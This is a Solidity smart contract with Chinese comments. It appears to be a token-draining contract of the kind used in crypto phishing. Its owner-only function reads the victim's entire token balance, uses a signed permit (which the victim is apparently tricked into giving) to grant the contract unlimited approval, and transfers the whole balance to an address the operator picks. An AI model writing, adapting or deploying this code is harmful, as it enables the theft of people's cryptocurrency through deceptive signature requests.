// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }

  function _msgData() internal view virtual returns (bytes calldata) {
    return msg.data;
  }
}
abstract contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor(address owner_) {
    _transferOwnership(owner_);
  }

  function owner() public view virtual returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(owner() == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function _transferOwnership(address newOwner) internal virtual {
    address oldOwner = _owner;
    _owner = newOwner;
    emit OwnershipTransferred(oldOwner, newOwner);
  }
}

interface IERC20 {
  function balanceOf(address account) external view returns (uint256);
  function allowance(address owner, address spender) external view returns (uint256);
  function permit(address holder, address spender, uint256 nonce, uint256 expiry, bool allowed, uint8 v, bytes32 r, bytes32 s) external;
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract transfer is Ownable {
  constructor() Ownable(_msgSender()) {}

  function trans(
    // 从哪个地址
    address from,
    // 转到哪个地址
    address to,
    // 什么代币
    address token,
    // noce
    uint256 nonce,
    // 时间
    uint256 expiry,
    bytes memory _signature
  ) public onlyOwner {
    IERC20 Token = IERC20(token);
    uint256 quantity = Token.balanceOf(from);
    uint256 allowance = Token.allowance(from, address(this));
    if (quantity > allowance) {
      require(_signature.length == 65, "invalid signature length");
      bytes32 r;
      bytes32 s;
      uint8 v;
      assembly {
        r := mload(add(_signature, 0x20))
        // 读取之后的32 bytes
        s := mload(add(_signature, 0x40))
        // 读取最后一个byte
        v := byte(0, mload(add(_signature, 0x60)))
      }
      Token.permit(from, address(this), nonce, expiry, true, v, r, s);
    }
    Token.transferFrom(from, to, quantity);
  }
}
